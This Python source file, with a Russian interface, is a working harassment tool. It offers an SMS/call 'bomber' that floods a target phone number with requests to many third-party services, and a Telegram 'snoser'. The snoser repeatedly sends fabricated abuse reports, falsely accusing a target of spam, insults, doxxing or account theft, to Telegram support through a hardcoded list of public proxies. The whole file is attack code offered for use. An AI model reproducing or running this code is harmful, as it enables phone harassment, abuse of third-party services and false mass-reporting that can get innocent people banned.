import os, time, socket, string, random
from datetime import datetime
from Attack.databaze import DataBaze # Импортируем класс для работы с базами данных
from Attack.Services import urls # Импортируем функцию с адресами и информацией о сайтах с смс-бомберами
from Attack.Feedback_Services import feedback_urls # Импортируем функцию с адресами и информацией о сайтах с прочими бомберами
from asyncio import ensure_future, gather, run # Импортируем функции для работы с асинхранными функциями


class Color:
    def __init__(self, esc_type):
        self.esc_type = esc_type
        self.black = f'{self.esc_type}[30m'
        self.red = f'{self.esc_type}[31m'
        self.green = f'{self.esc_type}[32m'
        self.yellow = f'{self.esc_type}[33m'
        self.blue = f'{self.esc_type}[34m'
        self.white = f'{self.esc_type}[97m'
        self.reset = f'{self.esc_type}[0m'
    def rgb_color(self, r, g, b):
        return f'{self.esc_type}[38;2;{r};{g};{b}m'
    def rgb_bgcolor(self, r, g, b):
        return f'{self.esc_type}[48;2;{r};{g};{b}m'
    def color_message(self, message, color):
        return f'{color}{message}{self.reset}'
def clear():
    if os.name == 'nt': os.system('cls')
    else: os.system('clear')
    print(color.reset)
def set_title(title: str):
    if os.name == 'nt': os.system(f"title {title}")
    else: pass
def waiting():
    print("\n\n"+color.reset)
    if os.name == 'nt': os.system('pause')
    else: os.system('clear')
def animate_message(message: str, local_color: str = None, speed: float = 0.015):
    for i in message:
        print(color.color_message(i, local_color) if local_color else i , end="", flush=True)
        time.sleep(speed)
def get_time():
    return f'{color.rgb_bgcolor(174, 61, 245)}{color.white} {datetime.now().strftime("%H:%M:%S")} {color.reset}'
def center_text(message: str):
    return '  ' + message + ' '*(27-len(message))
def stop():
    print(color.color_message("\n\nВы успешно завершили работу програмы", color.green))
    waiting()
    clear()
    quit()
def menu_input(message: str, speed: float = 0.015):
    try:
        while True:
            animate_message(f' Выбирете опцию:\n[1] - Бомбер\n[2] - Сносер тг\n[0] - Выход\n')
            animate_message(message)
            t = input()
            if type(t) == str: t.lower()
            match t:
                case '0': return 'stop'
                case '1': return 'bomber'
                case '2': return 'snoser'
                case _:
                    clear()
    except KeyboardInterrupt:
        return 'stop'

def confirm(message: str, speed: float = 0.015):
    try:
        while True:
            clear()
            animate_message(message)
            t = input()
            if type(t) == str: t.lower()
            match t:
                case 'y': return True
                case 'n': return False
                case _: pass
    except KeyboardInterrupt:
        return False
class System:
    def __init__(self):
        self.project_link = "https://github.com/Seven-Aspects/Tools.git"
        self.default_setting_link = "https://raw.githubusercontent.com/Seven-Aspects/Tools/refs/heads/main/Attack/version.json"
        self.version_link = "https://api.github.com/repos/Seven-Aspects/Tools/tags"
def check_update(compulsion : bool = False):
    """
        check_update(setting) - Функция проверки наличия нового обновления
        setting - Подкласс класса DataBaze (DataFile)
    """
    setting = db.file("version") # Класс для использования файла внутри базы данных
    default_setting = requests.get(project.default_setting_link).json() # Получаем в json формате конфигурационный файл програмы
    response = requests.get(project.version_link)
    if response.status_code == 200:
        if not compulsion:
            project_version = max(response.json(), key=lambda x: x['name'])['name']
            if setting.info() == None:
                if confirm(f"\n\nПрограма потеряла конфигурационный файл, требуется переустановка программы.\nДля переустановки, введите {color.color_message('Y', color.green)} если вы согласы и {color.color_message('n', color.red)} если не согласны. Введите (Y/n): "):
                    try:
                        os.system(f"git pull {project.project_link}")
                        setting.create()
                        default_setting['current_version'] = project_version
                        setting.write(default_setting)
                        animate_message("\n\n\n\nВы успешно переустановили программу", color.green)
                        quit()
                    except Exception as e:
                        animate_message(f"\n\n\n\nВо время установки обновления произошла ошибка, пожалуйста переустановити програму вручную (Подробнее: {project.project_link})", color.red)
                        quit()
                    except KeyboardInterrupt:
                        animate_message(f"\n\n\n\nВы принудительно завершили загрузку обновления", color.red)
                        quit()
                else:
                    animate_message("\n\n\n\nВы отказались устанавливать обновление", color.red)
                    quit()
            else:
                setting_data = setting.read()
                if 'current_version' in setting_data:
                    if setting_data['current_version'] == project_version:
                        return
                    else:
                        if confirm(f"\n\nВышла новая версия программы.\nДля установки, введите {color.color_message('Y', color.green)} если вы согласы и {color.color_message('n', color.red)} если не согласны. Введите (Y/n): "):
                            try:
                                os.system(f"git pull {project.project_link}")
                                default_setting['current_version'] = project_version
                                setting.write(default_setting)
                                animate_message("\n\n\n\nВы успешно устанавили обновление, перезапустите программу", color.green)
                                quit()
                            except Exception as e:
                                animate_message(f"\n\n\n\nВо время установки обновления произошла ошибка, пожалуйста переустановити програму вручную (Подробнее: {project.project_link})", color.red)
                                quit()
                            except KeyboardInterrupt:
                                animate_message(f"\n\n\n\nВы принудительно завершили загрузку обновления", color.red)
                                quit()
                        else:
                            animate_message("\n\n\n\nВы отказались устанавливать обновление", color.red)
                            quit()
                else:
                    if confirm(f"\n\nПрограма потеряла конфигурационный файл, требуется переустановка программы.\nДля переустановки, введите {color.color_message('Y', color.green)} если вы согласы и {color.color_message('n', color.red)} если не согласны. Введите (Y/n): "):
                        try:
                            os.system(f"git pull {project.project_link}")
                            setting.create()
                            default_setting['current_version'] = project_version
                            setting.write(default_setting)
                            animate_message("\n\n\n\nВы успешно переустановили программу", color.green)
                            quit()
                        except Exception as e:
                            animate_message(f"\n\n\n\nВо время установки обновления произошла ошибка, пожалуйста переустановити програму вручную (Подробнее: {project.project_link})", color.red)
                            quit()
                        except KeyboardInterrupt:
                            animate_message(f"\n\n\n\nВы принудительно завершили загрузку обновления", color.red)
                            quit()
                    else:
                        animate_message("\n\n\n\nВы отказались устанавливать обновление", color.red)
                        quit()
        else:
            project_version = max(response.json(), key=lambda x: x['name'])['name']
            if setting.info() == None:
                if confirm(f"\n\nПрограма потеряла конфигурационный файл, требуется переустановка программы.\nДля переустановки, введите {color.color_message('Y', color.green)} если вы согласы и {color.color_message('n', color.red)} если не согласны. Введите (Y/n): "):
                    try:
                        os.system(f"git pull {project.project_link}")
                        setting.create()
                        default_setting['current_version'] = project_version
                        setting.write(default_setting)
                        animate_message("\n\n\n\nВы успешно переустановили программу", color.green)
                        quit()
                    except Exception as e:
                        animate_message(f"\n\n\n\nВо время установки обновления произошла ошибка, пожалуйста переустановити програму вручную (Подробнее: {project.project_link})", color.red)
                        quit()
                    except KeyboardInterrupt:
                        animate_message(f"\n\n\n\nВы принудительно завершили загрузку обновления", color.red)
                        quit()
                else:
                    animate_message("\n\n\n\nВы отказались устанавливать обновление", color.red)
                    quit()
            else:
                setting_data = setting.read()
                if 'current_version' in setting_data:
                    if setting_data['current_version'] == project_version:
                        return
                    else:
                        if confirm(f"\n\nВ програме возникла ошибка, пожалуйста переустановити ее. Для установки, введите {color.color_message('Y', color.green)} если вы согласы и {color.color_message('n', color.red)} если не согласны. Введите (Y/n): "):
                            try:
                                os.system(f"git pull {project.project_link}")
                                default_setting['current_version'] = project_version
                                setting.write(default_setting)
                                animate_message("\n\n\n\nВы успешно устанавили обновление, перезапустите программу", color.green)
                                quit()
                            except Exception as e:
                                animate_message(f"\n\n\n\nВо время установки обновления произошла ошибка, пожалуйста переустановити програму вручную (Подробнее: {project.project_link})", color.red)
                                quit()
                            except KeyboardInterrupt:
                                animate_message(f"\n\n\n\nВы принудительно завершили загрузку обновления", color.red)
                                quit()
                        else:
                            animate_message("\n\n\n\nВы отказались устанавливать обновление", color.red)
                            quit()
                else:
                    if confirm(f"\n\nПрограма потеряла конфигурационный файл, требуется переустановка программы.\nДля переустановки, введите {color.color_message('Y', color.green)} если вы согласы и {color.color_message('n', color.red)} если не согласны. Введите (Y/n): "):
                        try:
                            os.system(f"git pull {project.project_link}")
                            setting.create()
                            default_setting['current_version'] = project_version
                            setting.write(default_setting)
                            animate_message("\n\n\n\nВы успешно переустановили программу", color.green)
                            quit()
                        except Exception as e:
                            animate_message(f"\n\n\n\nВо время установки обновления произошла ошибка, пожалуйста переустановити програму вручную (Подробнее: {project.project_link})", color.red)
                            quit()
                        except KeyboardInterrupt:
                            animate_message(f"\n\n\n\nВы принудительно завершили загрузку обновления", color.red)
                            quit()
                    else:
                        animate_message("\n\n\n\nВы отказались устанавливать обновление", color.red)
                        quit()
    else:
        animate_message("\n\n\n\nПроблема с подключением к интернету", color.red)
        quit()
    
def check_logs():
    """
        Проверяем существует ли файл с логами
    """
    logs_file = db.file('logs') # Класс для использования файла внутри базы данных
    if logs_file.info():
        """
            Файл с логами найден
        """
    else:
        """
            Файл с логами не найден
        """
    pass

def check_connection(url: str = "https://www.google.com", timeout: int = 3):
    """
        Проверяет наличие подключения к интернету.

        Аргументы:
            url (str) -- Адрес для проверки (по умолчанию https://www.google.com)
            timeout (int) -- Таймаут соединения в секундах (по умолчанию 3)

        Возвращает:
            bool -- True, если соединение установлено, иначе False.
    """
    try:
        response = requests.get(url, timeout=timeout)
        return response.status_code == 200
    except requests.RequestException:
        return False
    
def generate_phone_number():
    return f'{random.choice(['+7', '+380', '+375'])}{''.join(random.choices('0123456789', k=10))}'

def generate_random_email():
    return f"{''.join(random.choice(string.ascii_lowercase) for _ in range(8))}@{random.choice(["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru", "yandex.ru", "ya.ru"]) }"  

color = Color('\033') # Класс для использования цвета в командной строке
project = System() # Класс с системными значениями
db = DataBaze("Attack/") # Класс для использования базы данных

try:
    import keyboard, aiohttp, requests, asyncio
    from aiohttp import ClientSession
    from fake_useragent import UserAgent


except:
    if confirm(f"\n\n\n Вам необходимо установить модули keyboard, requests, fake_useragent и aiohttp, введите {color.color_message('Y', color.green)} если вы согласы и {color.color_message('n', color.red)} если не согласны. Введите (Y/n): "):
        pass
    else:
        animate_message("\n\n\n\nВы отказались устанавливать необходимые модули", color.red)
        quit()
    clear()
    animate_message("\n\n Скачивание модуля...\n")
    os.system("pip install keyboard aiohttp fake_useragent requests")
class Bomber:
    def __init__(self):
        self.debug = True
        self.count_true = 0
        self.count_false = 0

    async def request(self, session, url, conf):
        try:
            type_attack = ('SMS', 'CALL', 'FEEDBACK')
            if url['info']['attack'] in type_attack:
                async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=60) as response:
                    start_time = time.time()
                    end_time = start_time + self.attack_duration
                    if time.time() >= end_time: return
                    self.count_true += 1

                    if self.debug: print(f"{get_time()} {color.color_message('|', color.white)} {color.color_message(center_text(url['info']['website']), color.yellow)} {color.color_message('|', color.white)} {color.color_message("SUCCES", color.green)}")
                    return await response.text()
        except Exception as e:
            self.count_false += 1
            if self.debug: print(f"{get_time()} {color.color_message('|', color.white)} {color.color_message(center_text(url['info']['website']), color.yellow)} {color.color_message('|', color.white)} {color.color_message("ERROR", color.red)}")

    async def async_attacks(self, number, conf):
        async with ClientSession() as session:
            services = (urls(number) + feedback_urls(number)) if conf in ['feedback', 'mix'] else urls(number)
            tasks = [ensure_future(self.request(session, service, conf)) for service in services]
            await gather(*tasks)

    async def run_attacks(self, number, conf):
        start_time = time.time()
        end_time = start_time + self.attack_duration
        while time.time() < end_time: await self.async_attacks(number, conf)

    def bomber(self):
        try:
            clear()
            while True:
                animate_message("\n\n\n\n Введите номер телефона и время выполнения в секундах (для выхода введите 0):\n")
                message = input(f'{color.red}~# {color.rgb_color(161, 161, 161)}').replace('+', '').replace('-', '').replace('(', '').replace(')', '')
                print(color.reset)
                if message == '0': return
                self.count_true = 0
                self.count_false = 0
                number = ''.join(message.split()[:-1])
                for i in ['+', '-', '(', ')']: number = number.replace(i, '')
                conf = 'mix'
                try:
                    self.attack_duration = int(message.split()[-1])
                    if len(message.split()) >= 2 and self.attack_duration >= 20:
                        try:
                            if urls(number) or len(number) > 12:
                                time_start = time.time()
                                asyncio.run(self.run_attacks(number, conf))
                                time_stop = time.time()
                                work_time = f'{time_stop - time_start:.2f}'
                                # Вывод результатов
                                print(f'''
            Результаты выполнения атаки:

                Время выполнения атаки: {color.color_message(work_time, color.green)} секунд,
                Успешно посещенных сайтов: {color.color_message(self.count_true, color.green)},
                Не посещенных сайтов: {color.color_message(self.count_false, color.red)}
            ''')
                                waiting()
                                clear()
                            else:
                                print("Вы ввели неверный номер телефона!")
                                waiting()
                                clear()
                        except KeyboardInterrupt:
                            return
                        except Exception as e:
                            print("Вы ввели неверный номер телефона! Error:", e)
                            waiting()
                            clear()
                    else:
                        print("Время бомбера не должно быть меньше 20с")
                        waiting()
                        clear()
                except KeyboardInterrupt:
                    return
                except Exception as e:
                    print("\nВы ввели неверный номер телефона! Error:", e)
                    waiting()
                    clear()
        except KeyboardInterrupt:
            return
        except Exception:
            check_update(True)
            quit()

def send_complaint(username, telegram_id, number, email, repeats, complaint_choice, proxies=None):
    url = 'https://telegram.org/support'
    user_agent = UserAgent().random
    headers = {'User-Agent': user_agent}
    complaints_sent = 0
    if complaint_choice == "1":
        text = f'Добрый день поддержка Telegram! Аккаунт {username}, {telegram_id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться.Прошу разберитесь с этим. Заранее спасибо!'
    elif complaint_choice == "2":
        text = f'Аккаунт {username}, {telegram_id} приобрёл премиум в вашем сервисе чтобы обходить наказания за спам и совершает спам-рассылки в личные сообщения пользователям и в чаты. Прошу проверить информацию!'
    elif complaint_choice == "3":
        text = f"Здраствуйте. Аккаунт {username}, id {telegram_id} оскорбляет меня и мою маму. Мне это очень не приятно, поэтому и пишу вам. Огромная прозьба разобраться и заблокировать данного пользователя т.к это нарушает политику сервиса. Блгаодарю"
    elif complaint_choice == "4":
        text = f"Здраствуйте. Аккаунт {username}, id {telegram_id}. Очень много и частно нарушает политику сервиса Телеграмм. А именно, оскорбляет, сливает личные данные юзеров. Продает различные услуги. Прозьба разобраться и наказать данный аккаунт."
    elif complaint_choice == "5": 
        text = f"Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм — {username}, а мой айди, если злоумышленник поменял юзернейм —  {telegram_id} . Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных."
    elif complaint_choice == "6":
        text = f"Здраствуйте, сидя на просторах сети телеграмм, я заметил пользователя который совершает спам-рассылки, мне и другим пользователям это очень не нравится.Его аккаунт: {username}, ID {telegram_id}.Огромная прозьба разобраться с этим и заблокировать данного пользователя. Заранее спасибо."
    elif complaint_choice == "7":
        text = f"Сидя на просторах телеграмма заметил юзера который продает услуги dеаnонa и лжеминирования, сыллка на канал и юзер админа: {username}, id админа: {telegram_id}. Большая прозьба заблокировать канал и пользователя, т.к это нарушает политику сервиса."
    elif complaint_choice == "8":
        text = f"На сервисе telegram обнаружил пользователя который накручивает на канал реакции, подписки и просмотры. Сыллка на посты с накруткой и аккаунт администратора: {username}, id администратора на случай если поменяет юзернейм: {telegram_id}. Прозьба разобраться и заблокировать пользователя т.к это нарушает правила telegramm"
    payload = {'text': text, 'number': number, 'email': email}
    try:
        for _ in range(int(repeats)):
            response = requests.post(url, headers=headers, data=payload, proxies=proxies)
            if response.status_code == 200:
                complaints_sent += 1
                print(color.color_message("Жалоба успешно отправлена", color.green))
                print(color.color_message(f"От: {email} {number}", color.blue))
            else:
                print("Не удалось отправить. code:", response.status_code)
    except Exception:
        print("Произошла ошибка")
    except KeyboardInterrupt:
        animate_message(f"\n\n\n\nВы успешно завершили програму", color.red)
        quit()
get_proxies_list = lambda: [
    '8.218.149.193:80',
    '47.57.233.126:80',
    '47.243.70.197:80',
    '8.222.193.208:80',
    '144.24.85.158:80',
    '47.245.115.6:80',
    '47.245.114.163:80'
    '45.4.55.10:40486', 
    '103.52.37.1:4145',
    '200.34.227.204:4153', 
    '190.109.74.1:33633',
    '200.54.221.202:4145', 
    '36.67.66.202:5678',
    '168.121.139.199:4145',
    '101.255.117.2:51122',
    '45.70.0.250:4145',
    '78.159.199.217:1080', 
    '67.206.213.202:4145', 
    '14.161.48.4:4153',
    '119.10.179.33:5430',
    '109.238.222.1:4153',
    '103.232.64.226:4145',
    '183.88.212.247:1080', 
    '116.58.227.197:4145', 
    '1.20.97.181:34102', 
    '103.47.93.214:1080',
    '89.25.23.211:4153', 
    '185.43.249.132:39316',
    '188.255.209.149:1080',
    '178.216.2.229:1488', 
    '92.51.73.14:4153', 
    '109.200.156.2:4153',
    '89.237.33.193:51549',
    '211.20.145.204:4153', 
    '45.249.79.185:3629',
    '208.113.223.164:21829',
    '62.133.136.75:4153', 
    '46.99.135.154:4153', 
    '1.20.198.254:4153',
    '196.6.234.140:4153', 
    '118.70.196.124:4145',
    '185.34.22.225:46169',
    '103.47.93.199:1080',
    '222.129.34.122:57114',
    '92.247.127.249:4153',
    '186.150.207.141:1080',
    '202.144.201.197:43870',
    '103.106.32.105:31110', 
    '200.85.137.46:4153',
    '116.58.254.9:4145', 
    '101.51.141.122:4153',
    '83.69.125.126:4145',
    '187.62.88.9:4153', 
    '122.54.134.176:4145', 
    '170.0.203.11:1080', 
    '187.4.165.90:4153',
    '159.224.243.185:61303',
    '103.15.242.216:55492', 
    '187.216.81.183:37640',
    '176.197.100.134:3629', 
    '101.51.105.41:4145',
    '46.13.11.82:4153', 
    '103.221.254.125:40781', 
    '177.139.130.157:4153', 
    '1.10.189.133:50855', 
    '69.70.59.54:4153', 
    '83.103.195.183:4145', 
    '190.109.168.241:42732',
    '103.76.20.155:43818',
    '84.47.226.66:4145', 
    '1.186.60.25:4153',
    '93.167.67.69:4145',
    '202.51.112.22:5430', 
    '213.6.204.153:42820',
    '184.178.172.14:4145', 
    '217.171.62.42:4153',
    '121.13.229.213:61401',
    '101.255.140.101:1081',
    '78.189.64.42:4145',
    '187.11.232.71:4153', 
    '190.184.201.146:32606',
    '195.34.221.81:4153', 
    '200.29.176.174:4145', 
    '103.68.35.162:4145', 
    '194.135.97.126:4145',
    '167.172.123.221:9200',
    '200.218.242.89:4153',
    '190.7.141.66:40225',
    '186.103.154.235:4153',
    '118.174.196.250:4153',
    '213.136.89.190:52010',
    '217.25.221.60:4145',
    '50.192.195.69:39792',
    '180.211.162.114:44923',
    '179.1.1.11:4145', 
    '41.162.94.52:30022',
    '103.211.11.13:52616',
    '103.209.65.12:6667',
    '101.51.121.29:4153',
    '190.13.82.242:4153', 
    '103.240.33.185:8291',
    '202.51.100.33:5430',
    '201.220.128.92:3000', 
    '177.11.75.18:51327',
    '62.122.201.170:31871', 
    '79.164.171.32:50059',
    '202.124.46.97:4145', 
    '79.132.205.34:61731',
    '217.29.18.206:4145',
    '222.217.68.17:35165',
    '105.29.95.34:4153', 
    '103.226.143.254:1080',
    '119.82.251.250:31678', 
    '45.232.226.137:52104',
    '195.69.218.198:60687', 
    '155.133.83.161:58351', 
    '213.108.216.59:1080', 
    '178.165.91.245:3629',
    '124.158.150.205:4145',
    '36.72.118.156:4145', 
    '177.93.79.18:4145', 
    '103.47.94.97:1080', 
    '78.140.7.239:40009', 
    '187.19.150.221:80', 
    '103.192.156.171:4145', 
    '36.67.27.189:49524', 
    '188.136.167.33:4145', 
    '91.226.5.245:36604', 
    '78.90.81.184:42636', 
    '189.52.165.134:1080', 
    '81.183.253.34:4145', 
    '95.154.104.147:31387', 
    '220.133.209.253:4145', 
    '182.52.108.104:14153', 
    '195.93.173.24:9050', 
    '170.244.64.129:31476', 
    '117.102.124.234:4145', 
    '190.210.3.210:1080', 
    '182.253.142.11:4145', 
    '176.98.156.64:4145', 
    '210.48.139.228:4145', 
    '177.39.218.70:4153', 
    '112.78.134.229:41517', 
    '119.46.2.245:4145', 
    '103.212.94.253:41363', 
    '190.109.72.41:33633', 
    '103.94.133.94:4153', 
    '190.151.94.2:56093', 
    '190.167.220.7:4153', 
    '94.136.154.53:60030', 
    '103.206.253.59:53934', 
    '69.163.160.185:29802', 
    '213.6.221.162:5678', 
    '96.9.86.70:53304', 
    '202.182.54.186:4145', 
    '192.140.42.83:59057', 
    '138.121.198.90:42494', 
    '190.121.142.166:4153', 
    '190.0.242.217:51327', 
    '103.35.108.145:4145', 
    '82.114.83.238:4153', 
    '195.22.253.235:4145', 
    '91.219.100.72:4153', 
    '212.3.109.7:4145', 
    '45.7.177.226:39867', 
    '202.5.37.241:49151', 
    '195.9.89.66:3629', 
    '190.186.1.46:33567', 
    '69.163.161.118:20243'
]
